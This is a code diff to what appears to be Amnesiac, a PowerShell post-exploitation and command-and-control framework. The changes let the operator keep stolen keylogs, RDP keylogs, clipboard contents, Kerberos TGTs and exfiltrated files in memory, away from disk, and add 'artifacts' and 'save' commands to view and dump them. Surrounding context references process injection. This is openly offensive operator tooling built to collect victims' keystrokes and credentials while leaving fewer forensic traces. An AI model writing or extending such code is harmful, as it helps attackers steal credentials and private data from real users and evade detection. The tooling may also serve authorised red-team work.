@@ -291,6 +291,75 @@ function Amnesiac {
 			continue
 		}
 
+		if ($choice -match '^artifacts(\s+(keylogger|screenshots|clipboard|tgts|downloads))?$') {
+			$type = $Matches[2]
+			if (-not $type) {
+				Write-Host ""
+				Write-Host " [+] In-memory artifacts:" -ForegroundColor Cyan
+				Write-Host "     Keylogger:   $($global:AmnesiacArtifacts.Keylogger.Count) entries"
+				Write-Host "     Screenshots: $($global:AmnesiacArtifacts.Screenshots.Count) items"
+				Write-Host "     Clipboard:   $($global:AmnesiacArtifacts.Clipboard.Count) entries"
+				Write-Host "     TGTs:        $($global:AmnesiacArtifacts.TGTs.Count) entries"
+				Write-Host "     Downloads:   $($global:AmnesiacArtifacts.Downloads.Count) files"
+				Write-Host ""
+			} elseif ($type -eq 'keylogger') {
+				if ($global:AmnesiacArtifacts.Keylogger.Count -eq 0) {
+					$global:Message = " [-] No keylogger data captured."
+				} else {
+					Write-Host ""
+					$global:AmnesiacArtifacts.Keylogger | ForEach-Object { Write-Host $_ }
+					Write-Host ""
+				}
+			} elseif ($type -eq 'clipboard') {
+				if ($global:AmnesiacArtifacts.Clipboard.Count -eq 0) {
+					$global:Message = " [-] No clipboard data captured."
+				} else {
+					$global:AmnesiacArtifacts.Clipboard | ForEach-Object { Write-Host $_ }
+				}
+			} elseif ($type -eq 'tgts') {
+				$global:AmnesiacArtifacts.TGTs | ForEach-Object { Write-Host $_ }
+			} elseif ($type -eq 'downloads') {
+				$global:AmnesiacArtifacts.Downloads.Keys | ForEach-Object {
+					$sz = $global:AmnesiacArtifacts.Downloads[$_].Length
+					Write-Host "  $_ ($sz bytes)"
+				}
+			}
+			continue
+		}
+
+		if ($choice -match '^save(\s+(all|keylogger|screenshots|clipboard|tgts|downloads))?(\s+(.+))?$') {
+			$type = $Matches[2]
+			$path = if ($Matches[4]) { $Matches[4] } else { "$env:USERPROFILE\Desktop\amnesiac-artifacts" }
+
+			if ($type -eq 'all' -or -not $type) {
+				$null = New-Item -Path $path -ItemType Directory -Force
+				if ($global:AmnesiacArtifacts.Keylogger.Count -gt 0) {
+					$global:AmnesiacArtifacts.Keylogger | Out-File "$path\keylogger.txt" -Encoding UTF8
+				}
+				if ($global:AmnesiacArtifacts.Clipboard.Count -gt 0) {
+					$global:AmnesiacArtifacts.Clipboard | Out-File "$path\clipboard.txt" -Encoding UTF8
+				}
+				if ($global:AmnesiacArtifacts.TGTs.Count -gt 0) {
+					$global:AmnesiacArtifacts.TGTs | Out-File "$path\tgts.txt" -Encoding UTF8
+				}
+				$global:AmnesiacArtifacts.Downloads.GetEnumerator() | ForEach-Object {
+					[System.IO.File]::WriteAllBytes("$path\$($_.Key)", $_.Value)
+				}
+				$global:Message = " [+] Artifacts saved to: $path"
+			} elseif ($type -eq 'keylogger') {
+				$outFile = if ($Matches[4]) { $Matches[4] } else { "$env:USERPROFILE\Desktop\keylogger.txt" }
+				$global:AmnesiacArtifacts.Keylogger | Out-File $outFile -Encoding UTF8
+				$global:Message = " [+] Keylogger saved to: $outFile"
+			} elseif ($type -eq 'downloads') {
+				$null = New-Item -Path $path -ItemType Directory -Force
+				$global:AmnesiacArtifacts.Downloads.GetEnumerator() | ForEach-Object {
+					[System.IO.File]::WriteAllBytes("$path\$($_.Key)", $_.Value)
+				}
+				$global:Message = " [+] Downloads saved to: $path"
+			}
+			continue
+		}
+
 		if ($choice -eq 'exit') {
 			
 			for ($i = $global:listenerSessions.Count - 1; $i -ge 0; $i--) {
@@ -2010,13 +2079,20 @@ function InteractWithPipeSession{
 				$counter++
 				$fileName = Join-Path -Path $directory -ChildPath ("$baseFileNameWithoutExtension($counter)$fileExtension")
 			}
-			[System.IO.File]::WriteAllBytes($fileName, [Convert]::FromBase64String($fileContentBase64))
-			Write-Output "[+] File downloaded to $fileName"
+			# Store downloaded file — disk or memory depending on DiskMode
+			$fileBytes = [Convert]::FromBase64String($fileContentBase64)
+			if ($global:DiskMode) {
+				[System.IO.File]::WriteAllBytes($fileName, $fileBytes)
+				Write-Output "[+] File downloaded to $fileName"
+			} else {
+				$global:AmnesiacArtifacts.Downloads[$remotefileName] = $fileBytes
+				Write-Output "[+] File captured in memory: $remotefileName ($($fileBytes.Length) bytes). Use 'artifacts downloads' or 'save downloads'."
+			}
 			Write-Output ""
-			
+
 			continue
 		}
-		
+
 		elseif ($command -eq 'GListener') {
 			Print-MultiListener -NoWait
 			continue
@@ -2270,16 +2346,21 @@ function InteractWithPipeSession{
 				$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + "($counter)" + $fileExtension)
 			}
 			
-			# Save clipboard to file
+			# Save keylog — disk or memory depending on DiskMode
 			if($KeylogContent){
-				[System.IO.File]::WriteAllText($fileName, $KeylogContent)
-				Write-Output "[+] Keylog saved to $fileName"
+				if ($global:DiskMode) {
+					[System.IO.File]::WriteAllText($fileName, $KeylogContent)
+					Write-Output "[+] Keylog saved to $fileName"
+				} else {
+					$global:AmnesiacArtifacts.Keylogger.Add($KeylogContent.Trim())
+					Write-Output "[+] Keylog captured in memory ($($global:AmnesiacArtifacts.Keylogger.Count) entries). Use 'artifacts keylogger' or 'save keylogger'."
+				}
 				Write-Output ""
 			}
 			else {Write-Output "[-] Empty Keylog";Write-Output ""}
-			
+
 			continue
-			
+
 		}
 
   		elseif($Command -eq "RDPKeylog"){
@@ -2342,18 +2423,23 @@ function InteractWithPipeSession{
 				$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + "($counter)" + $fileExtension)
 			}
 			
-			# Save clipboard to file
+			# Save RDP keylog — disk or memory depending on DiskMode
 			if($KeylogContent){
-				[System.IO.File]::WriteAllText($fileName, $KeylogContent)
-				Write-Output "[+] RDP Keylog saved to $fileName"
+				if ($global:DiskMode) {
+					[System.IO.File]::WriteAllText($fileName, $KeylogContent)
+					Write-Output "[+] RDP Keylog saved to $fileName"
+				} else {
+					$global:AmnesiacArtifacts.Keylogger.Add($KeylogContent.Trim())
+					Write-Output "[+] RDP Keylog captured in memory ($($global:AmnesiacArtifacts.Keylogger.Count) entries). Use 'artifacts keylogger' or 'save keylogger'."
+				}
 				Write-Output ""
 			}
 			else {Write-Output "[-] Empty RDP Keylog";Write-Output ""}
-			
+
 			continue
-			
+
 		}
-		
+
 		elseif ($command -like "Upload *") {
 			$localFullPath = $command.Split(' ', 2)[1]
 			
@@ -2583,19 +2669,24 @@ function InteractWithPipeSession{
 				$fileName = Join-Path -Path $directory -ChildPath ($baseFileName + "($counter)" + $fileExtension)
 			}
 			
-			# Save clipboard to file
+			# Save clipboard — disk or memory depending on DiskMode
 			if($ClipboardContent){
 				Write-Output $ClipboardContent.Trim()
 				Write-Output ""
-				[System.IO.File]::WriteAllText($fileName, $ClipboardContent)
-				Write-Output "[+] Clipboard saved to $fileName"
+				if ($global:DiskMode) {
+					[System.IO.File]::WriteAllText($fileName, $ClipboardContent)
+					Write-Output "[+] Clipboard saved to $fileName"
+				} else {
+					$global:AmnesiacArtifacts.Clipboard.Add($ClipboardContent.Trim())
+					Write-Output "[+] Clipboard captured in memory ($($global:AmnesiacArtifacts.Clipboard.Count) entries). Use 'artifacts clipboard' or 'save clipboard'."
+				}
 				Write-Output ""
 			}
 			else {Write-Output "[-] Empty Clipboard";Write-Output ""}
-			
+
 			continue
 		}
-		
+
 		elseif ($command -like "PInject *") {
 			
 			$commandParts = $command -split '\s+', 3
